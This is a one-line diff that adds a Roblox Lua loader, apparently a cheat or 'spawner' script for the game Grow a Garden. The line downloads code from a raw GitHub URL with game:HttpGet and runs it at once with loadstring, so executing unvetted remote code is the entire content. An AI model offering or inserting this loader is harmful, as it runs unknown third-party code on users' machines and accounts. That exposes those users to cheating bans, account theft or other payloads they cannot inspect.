@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGardenPremium/DarkSpawner-GrowAGarden/refs/heads/main/20f1573edcf698721c7f851aa16631f8.txt"))()
